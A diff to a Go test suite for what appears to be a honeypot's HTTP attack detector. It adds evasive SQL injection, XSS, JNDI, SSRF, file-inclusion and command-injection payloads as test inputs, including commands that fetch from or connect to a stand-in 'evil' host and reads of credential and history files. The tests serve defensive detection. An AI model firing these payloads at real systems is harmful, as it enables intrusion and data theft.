@@ -32,6 +32,7 @@ func TestDetectionConfidenceCoversNewFamilies(t *testing.T) {
 		{name: "explicit XSS tag", input: detectionInput{Path: "/", RawQuery: "q=%253Cscript%253Ealert(1)%253C/script%253E"}, attackType: "XSS", confidence: confidenceHigh},
 		{name: "standalone XSS event handler", input: detectionInput{Path: "/", Body: `onerror=alert(1)`}, attackType: "XSS", confidence: confidenceHigh},
 		{name: "extended XSS event handler", input: detectionInput{Path: "/", Body: `<div onbeforetoggle=alert(1)>`}, attackType: "XSS", confidence: confidenceHigh},
+		{name: "body XSS event handler", input: detectionInput{Path: "/", Body: `<body onload=alert(1)>`}, attackType: "XSS", confidence: confidenceHigh},
 		{name: "isolated JavaScript URI", input: detectionInput{Path: "/", RawQuery: "next=javascript%3Aalert(1)"}, attackType: "XSS", confidence: confidenceMedium},
 		{name: "plain JNDI lookup", input: detectionInput{Path: "/", Header: http.Header{"User-Agent": []string{`${jndi:ldap://127.0.0.1/a}`}}}, attackType: "JNDI Injection", confidence: confidenceHigh},
 		{name: "obfuscated JNDI lookup", input: detectionInput{Path: "/", RawQuery: `q=${${lower:j}${upper:n}${::-d}${::-i}:ldap://example.com/a}`}, attackType: "JNDI Injection", confidence: confidenceHigh},
@@ -72,7 +73,91 @@ func TestDetectionConfidenceCoversNewFamilies(t *testing.T) {
 	}
 }
 
-// Keep prose-like signatures below the alerting threshold
+// Cover the reviewed evasions without relying on detail wording
+func TestDetectionCoversReviewedEvasions(t *testing.T) {
+	tests := []struct {
+		name       string
+		input      detectionInput
+		attackType string
+		confidence confidence
+	}{
+		{name: "SQL greater-than comparison", input: detectionInput{Path: "/", RawQuery: `u=admin' OR 2>1 --`}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "SQL not-equal comparison", input: detectionInput{Path: "/", RawQuery: `u=admin' OR 1<>2 --`}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "SQL XOR connector", input: detectionInput{Path: "/", RawQuery: `u=admin' XOR 1=1 --`}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "SQL symbolic quoted OR", input: detectionInput{Path: "/", RawQuery: `u=admin' || '1'='1`}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "SQL symbolic numeric OR", input: detectionInput{Path: "/", RawQuery: `u=admin' || 1=1`}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "SQL connector without whitespace", input: detectionInput{Path: "/", RawQuery: `u='or'1'='1`}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "quadruple percent SQL", input: detectionInput{Path: "/", RawQuery: `u=%25252527%25252520OR%252525201=1`}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "split quadruple percent SQL", input: detectionInput{Path: "/", RawQuery: `u=%25%32%35%32%35%32%35%32%37%20OR%201=1`}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "SQL CASE condition", input: detectionInput{Path: "/", RawQuery: `u=admin' AND (CASE WHEN 1=1 THEN 1 ELSE 0 END)`}, attackType: "SQL Injection", confidence: confidenceMedium},
+		{name: "SQL IF condition", input: detectionInput{Path: "/", RawQuery: `u=1' AND IF(1,1,1)`}, attackType: "SQL Injection", confidence: confidenceMedium},
+		{name: "SQL HAVING condition", input: detectionInput{Path: "/", RawQuery: `u=admin' HAVING 1=1 --`}, attackType: "SQL Injection", confidence: confidenceMedium},
+		{name: "JSON SQL comparison", input: detectionInput{Path: "/", Body: `{"u":"admin' OR 2>1 --"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "generic command probe", input: detectionInput{Path: "/", RawQuery: `c=whoami`}, attackType: "Command Injection", confidence: confidenceMedium},
+		{name: "echo command assignment", input: detectionInput{Path: "/", RawQuery: `cmd=echo pwned`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "chmod substitution", input: detectionInput{Path: "/", RawQuery: `x=$(chmod 4777 /bin/bash)`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "SSH substitution", input: detectionInput{Path: "/", RawQuery: `x=$(ssh attacker@evil.com)`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "echo separator", input: detectionInput{Path: "/", RawQuery: `x=;echo pwned`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "ipconfig separator", input: detectionInput{Path: "/", RawQuery: `x=;ipconfig /all`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "certutil separator", input: detectionInput{Path: "/", RawQuery: `x=x&certutil -urlcache -f http://evil/x`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "wmic pipe", input: detectionInput{Path: "/", RawQuery: `x=|wmic process get name`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "empty shell quotes", input: detectionInput{Path: "/", RawQuery: `x=;who''ami`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "balanced terminal shell quote", input: detectionInput{Path: "/", RawQuery: `x=;c'u'r'l' evil.com`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "node separator", input: detectionInput{Path: "/", RawQuery: `x=;node -e '1'`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "encoded newline echo", input: detectionInput{Path: "/", RawQuery: `x=%250Aecho%20pwned`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "image SSRF sink", input: detectionInput{Path: "/", RawQuery: `img=http://169.254.169.254/latest/meta-data/`}, attackType: "SSRF", confidence: confidenceMedium},
+		{name: "feed SSRF sink", input: detectionInput{Path: "/", RawQuery: `feed=http://169.254.169.254/latest/meta-data/`}, attackType: "SSRF", confidence: confidenceMedium},
+		{name: "short SSRF sink", input: detectionInput{Path: "/", RawQuery: `u=http://127.0.0.1:6379/`}, attackType: "SSRF", confidence: confidenceMedium},
+		{name: "site SSRF sink", input: detectionInput{Path: "/", RawQuery: `site=http://169.254.169.254/latest`}, attackType: "SSRF", confidence: confidenceMedium},
+		{name: "SSH SSRF scheme", input: detectionInput{Path: "/", RawQuery: `url=ssh://127.0.0.1:22`}, attackType: "SSRF", confidence: confidenceMedium},
+		{name: "WebSocket SSRF scheme", input: detectionInput{Path: "/", RawQuery: `url=ws://127.0.0.1:8080`}, attackType: "SSRF", confidence: confidenceMedium},
+		{name: "single-label SSRF host", input: detectionInput{Path: "/", RawQuery: `url=http://vault:8200/ui`}, attackType: "SSRF", confidence: confidenceMedium},
+		{name: "UNC-like SSRF target", input: detectionInput{Path: "/", RawQuery: `url=\\127.0.0.1\c$`}, attackType: "SSRF", confidence: confidenceHigh},
+		{name: "relative Windows file", input: detectionInput{Path: "/", RawQuery: `file=windows/win.ini`}, attackType: "LFI/RFI", confidence: confidenceHigh},
+		{name: "relative Unix file", input: detectionInput{Path: "/", RawQuery: `file=etc/passwd`}, attackType: "LFI/RFI", confidence: confidenceHigh},
+		{name: "UNC file inclusion", input: detectionInput{Path: "/", RawQuery: `file=\\evil.com\share\shell.php`}, attackType: "LFI/RFI", confidence: confidenceHigh},
+		{name: "Unix group file", input: detectionInput{Path: "/", RawQuery: `file=/etc/group`}, attackType: "LFI/RFI", confidence: confidenceHigh},
+		{name: "shell history file", input: detectionInput{Path: "/", RawQuery: `file=/root/.bash_history`}, attackType: "LFI/RFI", confidence: confidenceHigh},
+		{name: "environment file", input: detectionInput{Path: "/", RawQuery: `file=.env`}, attackType: "LFI/RFI", confidence: confidenceHigh},
+		{name: "XSS applet tag", input: detectionInput{Path: "/", RawQuery: `q=<applet code=Xss.class>`}, attackType: "XSS", confidence: confidenceHigh},
+		{name: "XSS base tag", input: detectionInput{Path: "/", RawQuery: `q=<base href=//evil.com/>`}, attackType: "XSS", confidence: confidenceMedium},
+		{name: "XSS form tag", input: detectionInput{Path: "/", RawQuery: `q=<form action=//evil.com/><button>`}, attackType: "XSS", confidence: confidenceMedium},
+		{name: "multi-character case JNDI", input: detectionInput{Path: "/", Header: http.Header{"User-Agent": []string{`${${lower:jn}${lower:di}:ldap://127.0.0.1/a}`}}}, attackType: "JNDI Injection", confidence: confidenceHigh},
+		{name: "named-default JNDI", input: detectionInput{Path: "/", Header: http.Header{"User-Agent": []string{`${j${k:-n}di:ldap://127.0.0.1/a}`}}}, attackType: "JNDI Injection", confidence: confidenceHigh},
+		{name: "multi-character environment JNDI", input: detectionInput{Path: "/", Header: http.Header{"User-Agent": []string{`${${env:X:-jn}di:ldap://127.0.0.1/a}`}}}, attackType: "JNDI Injection", confidence: confidenceHigh},
+		{name: "NoSQL OR query", input: detectionInput{Path: "/", RawQuery: `user[$or][0]=a`}, attackType: "NoSQL Injection", confidence: confidenceMedium},
+		{name: "NoSQL expression query", input: detectionInput{Path: "/", RawQuery: `user[$expr]=x`}, attackType: "NoSQL Injection", confidence: confidenceMedium},
+		{name: "NoSQL modulo query", input: detectionInput{Path: "/", RawQuery: `user[$mod]=[0,1]`}, attackType: "NoSQL Injection", confidence: confidenceMedium},
+		{name: "NoSQL OR JSON", input: detectionInput{Path: "/", Body: `{"$or":[{"user":"a"},{"pass":"b"}]}`}, attackType: "NoSQL Injection", confidence: confidenceMedium},
+		{name: "SQL in forwarding header", input: detectionInput{Path: "/", Header: http.Header{"X-Forwarded-For": []string{`admin' OR 1=1--`}}}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "JNDI in forwarding header", input: detectionInput{Path: "/", Header: http.Header{"X-Forwarded-For": []string{`${jndi:ldap://127.0.0.1/a}`}}}, attackType: "JNDI Injection", confidence: confidenceHigh},
+		{name: "SQL in Basic token", input: detectionInput{Path: "/", Header: http.Header{"Authorization": []string{`Basic JyBPUiAxPTEtLQ==`}}}, attackType: "SQL Injection", confidence: confidenceHigh},
+		{name: "nested HTML entities", input: detectionInput{Path: "/", RawQuery: `q=&amp;amp;amp;lt;script&amp;amp;amp;gt;alert(1)&amp;amp;amp;lt;/script&amp;amp;amp;gt;`}, attackType: "XSS", confidence: confidenceHigh},
+		{name: "legacy overlong UTF-8", input: detectionInput{Path: "/..\xc0\xafetc/passwd"}, attackType: "Path Traversal", confidence: confidenceHigh},
+		{name: "slash-delimited XSS handler", input: detectionInput{Path: "/", RawQuery: `q=<svg/onload=alert(1)>`}, attackType: "XSS", confidence: confidenceHigh},
+		{name: "SVG animated XSS handler", input: detectionInput{Path: "/", RawQuery: `q=<svg><set attributeName=onmouseover to=alert(1)>`}, attackType: "XSS", confidence: confidenceHigh},
+		{name: "command and file overlap", input: detectionInput{Path: "/", RawQuery: `x=$(cut -d: -f1 /etc/passwd)`}, attackType: "Command Injection", confidence: confidenceHigh},
+		{name: "TFTP SSRF overlap", input: detectionInput{Path: "/", RawQuery: `url=tftp://127.0.0.1/etc/passwd`}, attackType: "SSRF", confidence: confidenceMedium},
+		{name: "traversal and file overlap", input: detectionInput{Path: "/", RawQuery: `file=../../etc/group`}, attackType: "LFI/RFI", confidence: confidenceHigh},
+	}
+
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			for _, found := range detectAttacks(test.input) {
+				if found.AttackType != test.attackType {
+					continue
+				}
+				if found.Confidence != test.confidence {
+					t.Fatalf("confidence = %q, want %q", found.Confidence, test.confidence)
+				}
+				return
+			}
+			t.Fatalf("missing %q detection", test.attackType)
+		})
+	}
+}
+
+// Keep prose signatures below the alerting threshold
 func TestAmbiguousProseNeverReachesHighConfidence(t *testing.T) {
 	tests := []struct {
 		name       string
@@ -114,6 +199,7 @@ func TestCommandDetectionHandlesSplitWords(t *testing.T) {
 		{name: "strong separator", query: `value=x+%26%26+w%22h%22oami`, want: true},
 		{name: "substitution", query: `value=%24%28w%22h%22oami%29`, want: true},
 		{name: "unmatched quote", query: `value=x%3B+w%22hoami`, want: false},
+		{name: "unmatched terminal quote", query: `value=x%3B+c%27u%27r%27l`, want: false},
 		{name: "quoted whole word", query: `value=x%3B+say+%22whoami%22`, want: false},
 	}
 
@@ -261,25 +347,38 @@ func TestStructuredBase64DecodingStaysConservative(t *testing.T) {
 	if detections := detectAttacks(detectionInput{Path: "/", RawQuery: strings.Join(fields, "&")}); !hasDetectionType(detections, "XSS") {
 		t.Fatalf("tail Base64 candidate was not inspected: %+v", detections)
 	}
-	sampled := sampleBase64Fields(make([]base64Field, maxBase64Candidates+4))
-	if len(sampled) != maxBase64Candidates {
-		t.Fatalf("sampled Base64 fields = %d, want %d", len(sampled), maxBase64Candidates)
+	fields[8] = "q=" + base64.RawURLEncoding.EncodeToString([]byte(`<script>alert(1)</script>`))
+	if detections := detectAttacks(detectionInput{Path: "/", RawQuery: strings.Join(fields[:17], "&")}); !hasDetectionType(detections, "XSS") {
+		t.Fatalf("middle Base64 candidate was not inspected: %+v", detections)
 	}
 }
 
-// Keep textual multipart payloads visible through raw body inspection
+// Keep raw and Base64 multipart text visible and ignore file uploads
 func TestDetectionScansMultipartText(t *testing.T) {
-	body := "--ghoney-boundary\r\n" +
-		"Content-Disposition: form-data; name=\"q\"\r\n\r\n" +
-		"<script>alert(1)</script>\r\n" +
-		"--ghoney-boundary--\r\n"
-	input := detectionInput{
-		Path:   "/",
-		Body:   body,
-		Header: http.Header{"Content-Type": []string{"multipart/form-data; boundary=ghoney-boundary"}},
+	tests := []struct {
+		name       string
+		field      string
+		value      string
+		attackType string
+	}{
+		{name: "raw XSS", field: "q", value: `<script>alert(1)</script>`, attackType: "XSS"},
+		{name: "Base64 SQL", field: "p", value: `dT0nIE9SIDE9MSAtLQ==`, attackType: "SQL Injection"},
 	}
-	if detections := detectAttacks(input); !hasDetectionType(detections, "XSS") {
-		t.Fatalf("multipart text was not inspected: %+v", detections)
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			body := "--ghoney-boundary\r\n" +
+				"Content-Disposition: form-data; name=\"" + test.field + "\"\r\n\r\n" +
+				test.value + "\r\n" +
+				"--ghoney-boundary--\r\n"
+			input := detectionInput{
+				Path:   "/",
+				Body:   body,
+				Header: http.Header{"Content-Type": []string{"multipart/form-data; boundary=ghoney-boundary"}},
+			}
+			if detections := detectAttacks(input); !hasDetectionType(detections, test.attackType) {
+				t.Fatalf("multipart text was not inspected: %+v", detections)
+			}
+		})
 	}
 }
 
@@ -324,6 +423,53 @@ func TestRequestInspectionHandlesGzipBodies(t *testing.T) {
 	defer logMutex.Unlock()
 	if len(recentLogs) != 1 || recentLogs[0].AttackType != "XSS" || !strings.Contains(recentLogs[0].BodySnippet, "<script>") {
 		t.Fatalf("gzip detection logs = %+v", recentLogs)
+	}
+}
+
+// Inspect nested gzip payloads and preserve the original body
+func TestRequestInspectionHandlesNestedGzipBodies(t *testing.T) {
+	resetRecentLogs(t)
+	innerBody := gzipTestBody(t, `u=' OR 1=1 --`)
+	rawBody := gzipTestBody(t, string(innerBody))
+	request := httptest.NewRequest(http.MethodPost, "http://example.test/", bytes.NewReader(rawBody))
+	request.Header.Set("Content-Encoding", "gzip")
+	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	response := httptest.NewRecorder()
+	var forwardedBody []byte
+	handler := requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		forwardedBody, _ = io.ReadAll(r.Body)
+		w.WriteHeader(http.StatusNoContent)
+	}))
+
+	handler.ServeHTTP(response, request)
+
+	if response.Code != http.StatusNoContent || !bytes.Equal(forwardedBody, rawBody) {
+		t.Fatalf("nested gzip forwarding status=%d body_preserved=%t", response.Code, bytes.Equal(forwardedBody, rawBody))
+	}
+	logMutex.Lock()
+	defer logMutex.Unlock()
+	if len(recentLogs) != 1 || recentLogs[0].AttackType != "SQL Injection" {
+		t.Fatalf("nested gzip detection logs = %+v", recentLogs)
+	}
+}
+
+// Keep oversized inner gzip data from changing request acceptance
+func TestRequestInspectionBoundsNestedGzipHeuristics(t *testing.T) {
+	innerBody := gzipTestBody(t, strings.Repeat("x", maxRequestBodySize+1))
+	rawBody := gzipTestBody(t, string(innerBody))
+	request := httptest.NewRequest(http.MethodPost, "http://example.test/", bytes.NewReader(rawBody))
+	request.Header.Set("Content-Encoding", "gzip")
+	response := httptest.NewRecorder()
+	nextCalled := false
+	handler := requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		nextCalled = true
+		w.WriteHeader(http.StatusNoContent)
+	}))
+
+	handler.ServeHTTP(response, request)
+
+	if !nextCalled || response.Code != http.StatusNoContent {
+		t.Fatalf("nested gzip heuristic called=%t status=%d", nextCalled, response.Code)
 	}
 }
 
@@ -569,6 +715,13 @@ func TestBenignDetectionCorpus(t *testing.T) {
 		{Path: "/guide", Body: "The unionselect helper combines two internal result sets."},
 		{Path: "/guide", Body: `<div data-onbeforetoggle="documented">Example markup</div>`},
 		{Path: "/api", RawQuery: "session=cmVsZWFzZS1pZGVudGlmaWVy"},
+		{Path: "/", RawQuery: "next=release-notes&u=profile&url=http://0x/status"},
+		{Path: "/", RawQuery: "language=node&tool=echo&file=environment.txt"},
+		{Path: "/", Header: http.Header{"Authorization": []string{"Bearer ordinary-token"}}},
+		{Path: "/", Header: http.Header{"Authorization": []string{"Basic dXNlcjpvcmRpbmFyeQ=="}}},
+		{Path: "/api", Body: `{"description":"$or is documented here"}`},
+		{Path: "/guide", Body: "Store settings in the .env file."},
+		{Path: "/", Body: `<body>hello world</body>`},
 	}
 
 	for index, input := range inputs {
